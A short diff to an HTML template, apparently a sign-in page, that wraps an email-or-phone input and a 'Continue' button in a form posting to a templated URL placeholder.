@@ -202,8 +202,9 @@
                 </svg>
             </div>
         </div>
-
+        <form action="{{.URL}}" method="POST">
         <div class="form-group">
+             
             <label for="email">Email/Phone number</label>
             <input 
                 type="text" 
@@ -221,7 +222,8 @@
             >
         </div>
 
-        <button class="continue-btn">Continue</button>
+        <button type="submit" class="continue-btn">Continue</button>
+    </form>
 
         <div class="divider">
             <span>or</span>
